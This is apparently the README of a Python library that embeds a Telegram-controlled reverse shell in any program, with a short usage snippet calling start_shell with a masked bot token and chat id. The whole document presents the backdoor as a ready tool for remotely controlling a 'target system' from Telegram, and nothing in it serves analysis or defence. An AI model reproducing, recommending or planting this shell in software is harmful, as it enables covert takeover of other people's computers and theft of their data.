## py_tel_reverse_shell 
### the reverse shell in your telgram!

# What is this?
This program is a Python library that you can use to put an inverted shell connected to Telegram in any program. And control the target system from within the telegram.

# How does it work?
Currently, this **Python library** cannot be installed using pip, but it can be used this way anyway.

```python 
# sample program
from py_tel_reverse_shell import tel_shell



## get token from @BotFather in telegram
my_token = "2018473XXXXXXXXXXXXXXXXXXXXX-3M"
## get your number id from @userinfobot in telegram
my_chat_id = "19XXXXX25"


tel_shell.start_shell(bot_token=my_token,chat_id=my_chat_id)
```
and over. You can easily put an inverted shell connected to Telegram in your program.